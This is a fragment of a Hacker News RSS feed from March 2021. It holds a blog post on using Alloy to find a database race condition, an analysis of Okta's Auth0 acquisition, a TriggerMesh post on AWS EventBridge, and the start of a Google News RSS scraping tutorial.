            <guid isPermaLink="false">hacker-news-small-sites-26358959</guid>
            <pubDate>Fri, 05 Mar 2021 16:50:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[DataViz, Covid-19 Vaccination progress by country]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26358630">thread link</a>) | @patak_js
<br/>
March 5, 2021 | https://research.leniolabs.com/vaccinations | <a href="https://web.archive.org/web/*/https://research.leniolabs.com/vaccinations">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://research.leniolabs.com/vaccinations</link>
            <guid isPermaLink="false">hacker-news-small-sites-26358630</guid>
            <pubDate>Fri, 05 Mar 2021 16:25:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Alloy and an Adventure with Database Concurrency]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26358383">thread link</a>) | @lelf
<br/>
March 5, 2021 | https://blog.typeable.io/posts/2021-03-05-alloy.html | <a href="https://web.archive.org/web/*/https://blog.typeable.io/posts/2021-03-05-alloy.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p>This post is a short case study of using the Alloy modelling language to support software development work.</p>

<p>At Typeable we are very conscious about software quality and we are ready to go to some lengths to achieve it. Our current touchpoints for weeding out errors are the following:</p>
<ol type="1">
<li>Analysis and specification by dedicated persons</li>
<li>Applying Haskell type system is to weed out trivial errors</li>
<li>Usual unit and integration tests</li>
<li>Continuous integration</li>
<li>Mandatory code review</li>
<li>Testing in staging environment by dedicated QA engineers (check out <a href="https://github.com/typeable/octopod">Octopod</a>, our open-source solution for managing multiple deployments)</li>
<li>Testing in pre-production environment</li>
<li>Logging and error monitoring during production</li>
</ol>
<p>Having these many steps helps to keep the code good quality but it also imposes costs. The steps need both time and work.</p>
<p>One way of reducing these costs is by catching your errors early. To give a rough estimate, if the type system catches your error, it will do so within 30 seconds after saving your file. If the error is caught by the CI, it will take up to 30 minutes to produce the error message. And you have to wait another 30 minutes after fixing your mistake for the CI to run again.</p>
<p>The further you go down the chain, the longer these pauses get and the more resources are burned up by mistakes: reaching the QA stage might sometimes take days and then a QA engineer needs to engage with your work. And if the mistake is found here, not only must the QA redo their tests after the mistake is fixed, but the developer needs to pass through all the preceding stages again!</p>
<p>So, how far can we go to catch errors as early as possible? Surprisingly, there is a possibility to greatly improve our chances of catching errors even before writing a single line of code!</p>
<h2 id="enter-alloy">Enter Alloy</h2>
<p>This is where Alloy comes in. Alloy is a splendidly simple and ergonomic modelling tool that allows you to build testable specifications for the system you’re about to code.</p>
<p><img src="https://blog.typeable.io/images/alloy/1.png"></p>
<p>What Alloy does in practice is that it offers a simple language for building an abstract model of your idea or specification. And when the model is built, Alloy will do its best to show you all the disturbing things your specification will permit. It can also do model checking for any properties you think are important.</p>
<p>Let’s pick up an example! Recently we had a nuisance issue with the following bit of code:</p>
<div id="cb1"><pre><code><span id="cb1-1">newAuthCode</span>
<span id="cb1-2"><span>  ::</span> (<span>MonadWhatever</span> m)</span>
<span id="cb1-3">  <span>=&gt;</span> <span>DB.Client</span></span>
<span id="cb1-4">  <span>-&gt;</span> <span>DB.SessionId</span></span>
<span id="cb1-5">  <span>-&gt;</span> m <span>DB.AuthorizationCode</span></span>
<span id="cb1-6">newAuthCode clid sid <span>=</span> <span>do</span></span>
<span id="cb1-7">  <span>let</span> codeData <span>=</span> mkAuthCodeFor clid sid</span>
<span id="cb1-8">  void <span>$</span> DB.deleteAllCodes clid sid</span>
<span id="cb1-9">  void <span>$</span> DB.insertAuthCode codeData</span>
<span id="cb1-10">  <span>return</span> code</span></code></pre></div>
<p>This was in an HTTP endpoint and the code was supposed to go in to the database, delete all existing authorization codes for the user and write a new one in. Mostly, the code did just that. But it was also slowly filling our logs with “uniqueness constraint violation” messages.</p>
<p>How come?</p>
<h2 id="modelling">Modelling</h2>
<p>The above problem makes a good example problem for Alloy. Let’s try to figure it out by building a model! To model our specific problem case, we would usually start by describing our idea of <code>newAuthCode</code> operations to Alloy. That is, one would first build a model of the operations, then complement it by building a model of the database and linking the behaviour of the database to the operations.</p>
<p>However, in this case, it turns out that just formalizing our notion of what our operations could look like is enough to spot the problem.</p>
<p>The process described by our code snippet has two interesting parts. It does a delete at some point in time and then it inserts a new token at some other time. Here is one Alloy model for specifying this behaviour:</p>
<pre><code>open util/time  // Import premade Time objects

sig Operation       // There are operations...
  { delete : Time   // ...that do a delete on some time instance
  , insert : Time   // ...and an insert at some other time
  }
  { lt[delete,insert]  // The deletes happen before the inserts
    lt[first,delete]   // And, for technical reasons, nothing happens
                       // during the first time instance.
  }
  run {some Operation} for 4 // Show me a random instance with up to
                             // 4 Operations</code></pre>
<p>The above model describes a system of abstract objects and relationships between those objects. Running the model will then produce a random universe containing some <code>Operations</code> that are laid out according to the given rules.</p>
<p>If you want to follow along, download <a href="https://alloytools.org/">Alloy</a> and copy-paste the above snippet into it. Then press ‘execute’ and ‘show’ to get the following view of the model:</p>
<p><img src="https://blog.typeable.io/images/alloy/2.png"></p>
<p>To get Alloy to show you more models, you can press ‘next’.</p>
<p>Here is one of those random instances laid out as a relationship table (you need to press ‘next’ a few times and choose ‘Table’ view):</p>
<pre><code>┌──────────────┬──────┬──────┐
│this/Operation│delete│insert│
├──────────────┼──────┼──────┤
│Operation⁰    │Time¹ │Time³ │ ← Operation⁰ does a delete at Time¹ and
├──────────────┼──────┼──────┤   insert at Time³
│Operation¹    │Time² │Time³ │ ← Operation¹ does a delete at Time² and
└──────────────┴──────┴──────┘   insert at Time³
                         ↑
                      Oh dear!</code></pre>
<p>Usually, at this point, we’d start modelling database tables and semantics of the operations, but it turns out that Alloy has already managed to make it obvious why our logs have constraint violations!</p>
<p>Our handler gets called concurrently and the operation sequences overlap badly: there are two operations and they both do a delete around the same time and then <em>they both do an insert at the same time</em>. Also, since this is not a read, the postgresql default isolation level will not do anything to stop this from happening.</p>
<p>I found the bug!</p>
<h2 id="lets-fix-it">Let’s fix it!</h2>
<p>When I first investigated the issue, I wrote essentially the following fix for it.</p>
<div id="cb4"><pre><code><span id="cb4-1">code <span>&lt;-</span> run <span>$</span> <span>do</span></span>
<span id="cb4-2">  handleJust constraintViolation</span>
<span id="cb4-3">    (launchPG <span>$</span>&nbsp;selectCodeForSession clid scope sid</span>
<span id="cb4-4">    (launchPG <span>.</span> pgWithTransaction <span>$</span> newAuthCode clid scope sid)</span></code></pre></div>
<p>My idea was that if the operations did overlap and the insertion did fail, we then know that a new auth code has just been inserted. So, we can just do a <code>select</code> and return this existing code, since it can’t be more than a moment old.</p>
<h2 id="will-it-work-now">Will it work now?</h2>
<p>Let’s build a quick Alloy model for our fix to see if we got it correct:</p>
<pre><code>open util/time // Import Time

sig Token {} // There are objects called tokens

one sig DBState // There is a database with some tokens
 {userToken : Token lone -&gt; Time}
    // There are one or zero tokens at any given time in the DB
    // (because database constraints don't allow for more than one)

sig Operation {
   delete : Time
 , insert : Time
 , select : Time // Our operations can now also do a select
}
{
  lt[first,delete]   // Nothing happens on first time instance for
                     // technical reasons

  lt[delete,insert]  // delete happens first

  lte[insert,select] // insert can happen after, or at the same time
                     // as delete

  no userToken.(insert.prev) // If the insert works (ie. table is
  =&gt; insert = select         // empty when we try, we get the value
                             // at the time of the insert (ie. we have
                             // 'INSERT RETURNING' statement)
                             // Otherwise, we execute the exception handler and
                             // the select may happen a bit later.
}</code></pre>
<p>Up to this far the model follows the previous model quite closely. We added a <code>DBState</code> for modelling the table that stores our tokens and our operations now do a select, which must occur similarly as it occurs in our code. That is, if the table is empty, we select the token while inserting it and if the table is full, we select it later in the exception handler.</p>
<p>Then we get to the interesting part of the model, which is specifying the interactions between the operations and the database state. Luckily, for our model this is rather simple:</p>
<pre><code>fact Trace {                           // The trace fact describes how our system behaves
 all t : Time - first | {              // at all time steps, except the first:

   some delete.t =&gt; no userToken.t       // If there is a delete, the table is empty

   some insert.t =&gt; some userToken.t     // If there is an insert, table is not empty

   no delete.t and no insert.t           // If there are no inserts and no deletes,
	=&gt; userToken.t = userToken.(t.prev)  //   the table does not change
  }
}</code></pre>
<p>That is, we describe how the database changes state regarding which events take place.</p>
<p>Running this model creates many instances, but unlike before, just browsing through them is not enough to find anything obviously wrong. But we can ask Alloy to check some facts for us. This point can take a little thinking, but it seems that our fix could work if all the selects work.</p>
<p>Let’s state that as an assertion and ask Alloy to check if it holds.</p>
<pre><code>assert selectIsGood {         // This is what we want Alloy to check
 all s : Operation.select |   // For all times when there is a select
  some userToken.s            // there is also a token in the database.
}

check selectIsGood for 6 // Check that selectIsGood is always true.</code></pre>
<p>And, unfortunately, running this check gives us the following counterexample:</p>
<pre><code>┌────────┬────────────┐
│DBState │userToken   │
├────────┼──────┬─────┤
│DBState⁰│Token²│Time³│
│        │      ├─────┤  ← Token² is in the DB at Time³ and Time⁵
│        │      │Time⁵│
│        ├──────┼─────┤
│        │Token³│Time²│  ← Token³ is in the DB at Time².
└────────┴──────┴─────┘
                   ↑
                 There are tokens in the table
                 only on Time², Time³ and Time⁵
                 Notably, there are no tokens at
                 Time⁴!

┌──────────────┬──────┬──────┬──────┐
│Operation     │delete│insert│select│
├──────────────┼──────┼──────┼──────┤
│Operation⁰    │ TIME⁴│ Time⁵│ Time⁵│
├──────────────┼──────┼──────┼──────┤
│Operation¹    │ Time¹│ Time³│ TIME⁴│   ← The table is empty at Time⁴ and</code></pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.typeable.io/posts/2021-03-05-alloy.html">https://blog.typeable.io/posts/2021-03-05-alloy.html</a></em></p>]]>
            </description>
            <link>https://blog.typeable.io/posts/2021-03-05-alloy.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26358383</guid>
            <pubDate>Fri, 05 Mar 2021 16:09:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The reason Okta spent $6.5B on Auth0]]>
            </title>
            <description>
<![CDATA[
Score 215 | Comments 143 (<a href="https://news.ycombinator.com/item?id=26358309">thread link</a>) | @advaitruia
<br/>
March 5, 2021 | https://supertokens.io/blog/the-real-reason-okta-spent-on-auth0 | <a href="https://web.archive.org/web/*/https://supertokens.io/blog/the-real-reason-okta-spent-on-auth0">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://supertokens.io/static/webflow/blog/auth0-acquisition/images/okta_merged-14.png" loading="lazy" width="680" sizes="(max-width: 479px) 320px, (max-width: 767px) 540px, 680px" alt="Express session vs SuperTokens" srcset="https://supertokens.io/static/webflow/blog/auth0-acquisition/images/okta_merged-14-p-500.png 500w, https://supertokens.io/static/webflow/blog/auth0-acquisition/images/okta_merged-14-p-800.png 800w, https://supertokens.io/static/webflow/blog/auth0-acquisition/images/okta_merged-14-p-1080.png 1080w, https://supertokens.io/static/webflow/blog/auth0-acquisition/images/okta_merged-14-p-1600.png 1600w, https://supertokens.io/static/webflow/blog/auth0-acquisition/images/okta_merged-14.png 2835w"></p><p>March 05, 2021</p>

<p>Okta acquired <a href="https://www.okta.com/press-room/press-releases/okta-signs-agreement-to-acquire-auth0/">Auth0 for $6.5B</a> in an all stock deal (Okta was valued at ~$35B in the few days preceding the
announcement).<br></p>
<p>In July last year, Auth0 <a href="https://auth0.com/blog/auth0-announces-120m-seriesf-funding/">raised $120M</a> in private financing at a valuation of $1.9B. The round was led by Salesforce
Ventures with participation from DTCP and other existing investors.<br></p>
<p><strong>The acquisition is a ~3.5X jump in Auth0â€™s valuation from last year.Â&nbsp;</strong><br></p>
<h2 id="Security">Why acquire Auth0 for $6.5B?</h2>

<ol role="list">
<li>
<p><span>Complementary product and revenue streamâ€¨<br></span>Oktaâ€™s
core strength is workforce identity and it used to be almost all of their revenue. In the last few years,
revenues from their customer identity product has grown to 25% of total revenues from almost nothing. Auth0
core strength is customer identity. With Auth0, Okta has the best product for both use cases.<br></p>
</li>
<li>
<p><span>Increasing addressable marketâ€¨<br></span>According to Todd,
the founder of Okta, workforce identity is a $30B market and customer identity is $25B. The customer identity
space effectively doubles Oktaâ€™s addressable market. In return, Okta is paying 20% of its market cap for that
opportunity.<br></p><img src="https://supertokens.io/static/webflow/blog/auth0-acquisition/images/marketing_okta.png" loading="lazy" sizes="(max-width: 479px) 280px, (max-width: 767px) 500px, 640px" srcset="https://supertokens.io/static/webflow/blog/auth0-acquisition/images/marketing_okta-p-500.png 500w, https://supertokens.io/static/webflow/blog/auth0-acquisition/images/marketing_okta-p-800.png 800w, https://supertokens.io/static/webflow/blog/auth0-acquisition/images/marketing_okta-p-1080.png 1080w, https://supertokens.io/static/webflow/blog/auth0-acquisition/images/marketing_okta.png 1582w" alt="">
</li>
<li>
<p><span>Competition and pricing power<br></span>Auth0 is the most
prominent alternative that customers consider when evaluating Okta. The acquisition of Auth0 eliminates that
threat and grants Okta pricing power as a result.<br></p>
</li>
<li>
<p><span>Go To Market (GTM) strategy<br></span>Okta is built as a top
down sales organisation whereas Auth0 is built with a developer first bottoms up acquisition strategy. This
allows Okta to get the best of both worlds.<br></p>
<p>In the words of the Founder and CEO of Auth0, â€œWe have a large thriving developer
community, which provides powerful grassroot support for Auth0 within SMB and enterprise that we leverage in
our sales motion. Our developer-led adoption fosters rapid customer growthâ€�<br></p>
</li>
<li>
<p><span>Strategic acquisition<br></span>There were rumours that
Salesforce was interested in acquiring Auth0. Given that Salesforce has made several key acquisitions (Slack,
Mulesoft, and others) and led Auth0â€™s last round, this is a well founded theory. It is possible that Okta had
to make a preemptive move. Weâ€™ve heard anecdotally that Salesforceâ€™s and Oracleâ€™s identity solution were both
performing badly and they were looking to do something about it. Auth0 was the perfect candidate for and was
also supposedly being shopped around.<br></p>
</li>
</ol>
<p>Finally, â€¨there was a Hackernews comment along the lines of: â€œ$6,500,000,000.00 for a company
providing authentication APIs?â€� and the sentiment has been echoed by others too.<br></p>
<p>The thing to note is that Okta isn't just acquiring an API or a product. Itâ€™s acquiring
$200M in recurring revenue thatâ€™s probably growing at 50%. As soon as Okta acquires its largest competitor, it can
also refactor Auth0â€™s (and itâ€™s own) pricing to increase revenue even further. So it's paying a lot upfront
for what it hopes will be even more in the future.Â&nbsp;<br></p>
<p>Now that we have some clarity on the acquisition, weâ€™ll be looking at how the (stock) market,
users and employees reacted to the news (largely drawn from Reddit, Hackernews and some personal
conversations)<br></p>
<h2><strong>Reactions (and what this means)</strong><br></h2>

<p><span>Market<br></span>Oktaâ€™s will acquire Auth0 in an all stock deal
and dilute existing shareholders by 20%. The 10% fall in the stock price (equivalent to a decrease in $3-4B)
immediately post the announcement means that investors are valuing Auth0 at half the price what Okta paid for
it.<br></p>
<p>Okta will issue shares to Auth0 shareholders at share price of $276.21, close to 20% less
than the current share price (at the time of writing).<br></p><p><img src="https://supertokens.io/static/webflow/blog/auth0-acquisition/images/Screenshot-2021-03-05-at-17.35.19.png" loading="lazy" sizes="(max-width: 479px) 320px, (max-width: 767px) 540px, 680px" srcset="https://supertokens.io/static/webflow/blog/auth0-acquisition/images/Screenshot-2021-03-05-at-17.35.19-p-500.png 500w, https://supertokens.io/static/webflow/blog/auth0-acquisition/images/Screenshot-2021-03-05-at-17.35.19-p-800.png 800w, https://supertokens.io/static/webflow/blog/auth0-acquisition/images/Screenshot-2021-03-05-at-17.35.19-p-1080.png 1080w, https://supertokens.io/static/webflow/blog/auth0-acquisition/images/Screenshot-2021-03-05-at-17.35.19-p-1600.png 1600w, https://supertokens.io/static/webflow/blog/auth0-acquisition/images/Screenshot-2021-03-05-at-17.35.19.png 1830w" alt=""></p><p><strong>Users<br>â€�</strong>In general, the developer community has had an unpleasant
experience with Okta. This is perhaps expected given that it is not a â€œdeveloper firstâ€� company. Below are some
excerpts taken from Hackernews.<br></p>
<p>â€œWe moved from Okta a few years ago after we basically received almost no actual real support
for a bunch of issues, even though we were paying a premium cost. Nobody cares about issues on their Githubâ€�. â€œWe
ended up switching to Auth0â€�, â€œshaved a decent amount off our costsâ€�. â€œIn the end we were much happier.â€�<br></p>
<p>â€œOkta requires you to "contact support" to turn on basic features like email
customization, and even though I'm a paying customer, I was given a multi-week estimate (after waiting a week
or two) for how long it would take to enable this featureâ€�<br></p>
<p>â€œWe use Okta for multiple AWS accounts and they "ran a bad migration" that deleted
half our permissions and took a month to resolve. On top of that, nothing appeared in the audit logs.â€�<br></p>
<p>â€œOkta as a business are a pain to deal with, and unless you meet their minimum spend
requirements (which are not told to you up-front) you're screwed.â€�<br></p>
<p><strong>Employees<br>â€�</strong>Similarly, employees were worried about Auth0, given their
experience with Oktaâ€™s culture and hiring process.<br></p>
<p>â€œI interviewed with both, and the process at Auth0 had me walk away with respect, while
contrasted with Okta that left me reminded that tech hiring is broken.â€�<br></p>
<p>â€œThe two companies couldn't be more different, with Auth0 embracing a remote-first-class
culture with creative interview processes, and Okta (pre-covid) being very much the opposite.â€�<br></p>
<p>I used to work on the Okta team.. As far as I could tell, Okta is a sales company. The
salespeople got the fancy events, the high floors with nice views, all the budgetâ€¦ Enterprise customers are the
only ones that mattered.. I got to know some people who came into Okta via acquisitions and letâ€™s just say itâ€™s
not a fun ride.â€�<br></p>
<h2><strong>What next for Auth0?</strong><br></h2>

<p>â€¨Officially the statement is that the â€œCompany will operate as an independent unit inside of
Okta as they look for paths to integration in the coming monthsâ€�.<br></p>
<h2><strong>What is the opportunity for SuperTokens?â€¨</strong><br></h2>

<ol role="list">
<li>
<p>The incumbents in the space are Okta, Auth0, Firebase and AWS Cognito. However, they are all closed source,
proprietary companies. We have a strong belief in our open source approach as it benefits all stakeholders -
customers, the community and us as a company. There are a few others who are taking this approach and there is
a strong possibility for a project like SuperTokens to reach the scale that matches the incumbents.<br></p>
</li>
<li>
<p>Consolidation typically creates small vacuums. It is our job, as the project creators, to understand which
vacuum (niche) is the strongest.Â&nbsp;<br></p>
</li>
<li>
<div><p>We claim to be truly developer friendly. <b>But what does that really mean?</b> How do we demonstrate
that?
</p><ul>
<li>First is <b>our open source approach</b> - we place developers and the community above all else.</li>Â&nbsp;
<li>Second is the <b>modular architecture of SuperTokens</b>. This enables developers to pick features
they need
for their use
case and forget about the complexity associated with everything else (for example, if you do not need SSO,
no
need worry about OAuth flows). It allows you to add authentication functionality as your product and
company
scale.
<strong>We even have different docs based on your feature set and use case.<br>â€�</strong>
</li>
<li>Finally, our
frontend
UI is the most customizable weâ€™ve seen of any of the alternatives. While Auth0 provides a ready made
frontend
or exposes the backend APIs to build your own frontend, we provide ready made frontends and make it far
easier
to build your own theme or customize existing ones.<br></li>
</ul>
</div>
</li>
</ol>
<p>Hope this added some insight into this massive development. Weâ€™re excited about the space and
are here to serve developers everyday.<br></p>
<p>Written by the Folks at <a href="https://supertokens.io/" aria-current="page">SuperTokens</a> â€” hope you enjoyed! We are always available on our Discord server.
Join us if you have any questions or need any help.<br></p>
<p><a rel="noopener" href="https://supertokens.io/discord" target="_blank"><img src="https://supertokens.io/static/webflow/blog/auth0-acquisition/images/Image-93x.png" loading="lazy" width="200" alt=""></a>
</p></div></div>]]>
            </description>
            <link>https://supertokens.io/blog/the-real-reason-okta-spent-on-auth0</link>
            <guid isPermaLink="false">hacker-news-small-sites-26358309</guid>
            <pubDate>Fri, 05 Mar 2021 16:02:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[AWS just took a step towards Hybrid/Multi Cloud]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26358103">thread link</a>) | @socialized
<br/>
March 5, 2021 | https://www.triggermesh.com/blog/the-cloud-native-integration-hits-keep-on-rolling-with-aws-eventbridge-and-triggermesh | <a href="https://web.archive.org/web/*/https://www.triggermesh.com/blog/the-cloud-native-integration-hits-keep-on-rolling-with-aws-eventbridge-and-triggermesh">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>When&nbsp; I pontificated&nbsp; in January, on <a href="https://www.triggermesh.com/blog/event-driven-workflows-with-triggermesh-and-amazon-eventbridge">AWS EventBridge</a> and how it related to TriggerMesh,&nbsp; I opined that integration is the frontier in cloud computing that can produce the biggest impact on increasing cloud capabilities and shortening time-to-value. In January, I said this:</p><p>"Combining the power of TriggerMesh and AWS EventBridge, <a href="https://www.triggermesh.com/faq/what-is-aws-lambda">AWS</a> users can easily connect SaaS, cloud, and on-premises applications with Amazon Lambda and cloud-native architectures without writing any additional code. You can modernize your legacy applications to the cloud and leverage your existing IT investment by integrating with Amazon EventBridge and triggering workloads on modern architecture. Accelerate developer productivity and provide consistency when integrating non-AWS services with AWS."</p><p>This week, AWS <a href="https://aws.amazon.com/blogs/compute/using-api-destinations-with-amazon-eventbridge/" target="_blank">announced</a> new capabilities that makes it even easier for cloud developers to provide workflows between cloud and on-premises applications.&nbsp;</p><p>The number of cloud services is exploding and there is a lot of innovation that enterprises can take advantage of but they have legacy systems that they still depend on. That’s why our focus has become the integration of all services and applications in and out of the cloud, and it’s why our decision to provide integrations with AWS as the largest public cloud provider was a “no-brainer.” It’s edifying to see them following our lead and expanding their capabilities to integrate outside of their ecosystem.&nbsp;</p><p>In August of last year, we <a href="https://www.triggermesh.com/blog/triggermesh-enables-on-premises-and-hybrid-cloud-serverless-application-integrations-via-amazon-eventbridge">announced </a>our integration with EventBridge to use sources from a variety of cloud events to trigger AWS workloads. This unique capability means that TriggerMesh can act as a bridge to source events from any cloud service or application into AWS, and use this external data to feed AWS services without writing a single line of code.&nbsp;</p><p>With this week’s announcement, Amazon EventBridge has added the capability to export events from their ecosystem to other applications and services. This validates our point of view and we are excited to be able to extend this capability with an easy way to integrate AWS services with non-AWS services and applications.&nbsp;</p><figure><p><img src="https://global-uploads.webflow.com/5f683649f57c921f6db67087/6041383a7bbb53c87be73bec_Screen%20Shot%202021-03-04%20at%202.42.23%20PM.png" loading="lazy" alt=""></p></figure><p>The ability to use the TriggerMesh declarative API is another powerful reason why TriggerMesh and EvenBridge are two great tastes that taste great together.Cloud operators who want to manage their integrations the same way they use Cloud Formation or Terraform for <strong>infrastructure-as-code </strong>can use the TriggerMesh declarative API to deploy<strong> integrations-as-code</strong>. With this powerful capability, users can create and deploy automated event-driven workflows between AWS and a variety of popular cloud services and even create custom integrations with their existing on-premises applications and microservices. What’s more, you can use our declarative API to deploy integrations using your CI/CD loops, automating not only the deployment of applications and services but also the integrations between them.</p><p>We know that <a href="https://www.triggermesh.com/faq/what-is-cloud-native">cloud-native</a> developers want to build applications that connect a variety of services and data sources. Amazon provides many of the most widely-used cloud services, and for integrations with legacy applications, we believe that TriggerMesh is the best way to provide these enterprise integrations and to do so cloud-natively.&nbsp;</p></div><div><p><a href="https://www.triggermesh.com/team/mark-hinkle"><img loading="lazy" src="https://global-uploads.webflow.com/5f683649f57c921f6db67087/5f76cbef56ac8ba29514a504_mark.jpg" alt="Mark Hinkle"></a></p><div><p><a href="https://www.triggermesh.com/team/mark-hinkle">Mark Hinkle</a></p><p>Mark has a long history in emerging technologies and open source. Before co-founding TriggerMesh, he was the Executive Director of the Node.js Foundation with membership including Microsoft, IBM, Google, Intel, PayPal, and other industry leaders. Previously, he was the VP of Marketing at The Linux Foundation. Mark joined the Linux Foundation from Citrix where he was the Head of the Citrix Open Source Business Office.</p></div></div></div>]]>
            </description>
            <link>https://www.triggermesh.com/blog/the-cloud-native-integration-hits-keep-on-rolling-with-aws-eventbridge-and-triggermesh</link>
            <guid isPermaLink="false">hacker-news-small-sites-26358103</guid>
            <pubDate>Fri, 05 Mar 2021 15:46:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Advice you could give to your younger self regarding coding]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26357855">thread link</a>) | @eleftheria
<br/>
March 5, 2021 | https://eleftheriabatsou.hashnode.dev/355-advice-you-could-give-to-your-younger-self-regarding-coding | <a href="https://web.archive.org/web/*/https://eleftheriabatsou.hashnode.dev/355-advice-you-could-give-to-your-younger-self-regarding-coding">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>404</p><h2>We can’t find the page you’re looking for!</h2><p><a href="https://eleftheriabatsou.hashnode.dev/">Take me home</a></p></div></div>]]>
            </description>
            <link>https://eleftheriabatsou.hashnode.dev/355-advice-you-could-give-to-your-younger-self-regarding-coding</link>
            <guid isPermaLink="false">hacker-news-small-sites-26357855</guid>
            <pubDate>Fri, 05 Mar 2021 15:28:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Py package to scrape any Google News page without being blocked]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26357543">thread link</a>) | @artembugara
<br/>
March 5, 2021 | https://blog.newscatcherapi.com/scraping-google-news/ | <a href="https://web.archive.org/web/*/https://blog.newscatcherapi.com/scraping-google-news/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://images.unsplash.com/photo-1531169509526-f8f1fdaa4a67?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDM1fHxhYnN0cmFjdHxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000 300w,
                            https://images.unsplash.com/photo-1531169509526-f8f1fdaa4a67?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDM1fHxhYnN0cmFjdHxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000 600w,
                            https://images.unsplash.com/photo-1531169509526-f8f1fdaa4a67?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDM1fHxhYnN0cmFjdHxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000 1000w,
                            https://images.unsplash.com/photo-1531169509526-f8f1fdaa4a67?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDM1fHxhYnN0cmFjdHxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://images.unsplash.com/photo-1531169509526-f8f1fdaa4a67?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDM1fHxhYnN0cmFjdHxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000" alt="Advanced Google News scrapers with Python">
            </figure>

            <section>
                <div>
                    <p>We're going to use <code><a href="https://github.com/kotartemiy/pygooglenews">pygooglenews</a></code> package that will help us get structured news articles from any Google News page. </p><p><strong>Disclaimer</strong>: <a href="https://newscatcherapi.com/">NewsCatcher</a> team has created this Python package. If you want to know more about how this package works, read this article:</p><figure><a href="https://blog.newscatcherapi.com/google-news-rss/"><div><p>Google News RSS. The missing documentation</p><p>Get Google News RSS feeds by keyword, geo position, time range, topic. Get RSS feeds for websites that do not support it. Or, scrape google news without limits.</p><p><img src="https://blog.newscatcherapi.com/favicon.png"><span>ArtemBugara</span></p></div><p><img src="https://images.unsplash.com/photo-1533073526757-2c8ca1df9f1c?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDF8fGRpcmVjdGlvbnxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000"></p></a></figure><h3 id="pygooglenews-package-overview">PyGoogleNews package overview</h3><p><a href="https://github.com/kotartemiy/pygooglenews">pygooglenews</a> is a python wrapper of the <a href="https://news.google.com/rss?hl=en-US&amp;gl=US&amp;ceid=US:en">Google News RSS</a> feed. </p><figure><a href="https://github.com/kotartemiy/pygooglenews"><div><p>kotartemiy/pygooglenews</p><p>If Google News had a Python library. Contribute to kotartemiy/pygooglenews development by creating an account on GitHub.</p><p><img src="https://github.githubassets.com/favicons/favicon.svg"><span>GitHub</span><span>kotartemiy</span></p></div><p><img src="https://avatars.githubusercontent.com/u/18311982?s=400&amp;v=4"></p></a></figure><p>In a nutshell, it exploits the fact that Google News data can also be accessed via the RSS: even custom search! <strong>Months of testing have shown that Google won't block your IP if you access RSS feed 100k+ times per day</strong>. I believe it is because RSS is created to be accessed by other machines. Also, it is a super lightweight page (30 kB compared to 1 Mb+ google news UI). </p><h3 id="what-data-you-can-access-with-pygooglenews">What data you can access with pygooglenews</h3><ol><li>Top news</li><li>News articles by topic (business, politics, etc)</li><li>News articles by town, country, location</li><li>News by your custom search</li></ol><h3 id="demo">Demo</h3><figure><img src="https://blog.newscatcherapi.com/content/images/2021/03/pygooglenews-demo.gif" alt=""></figure><h3 id="installation">Installation</h3><pre><code>pip install pygooglenews --upgrade</code></pre><h3 id="1-top-google-news-articles">1. Top Google News articles</h3><pre><code>from pygooglenews import GoogleNews

# default GoogleNews instance
gn = GoogleNews(lang = 'en', country = 'US')

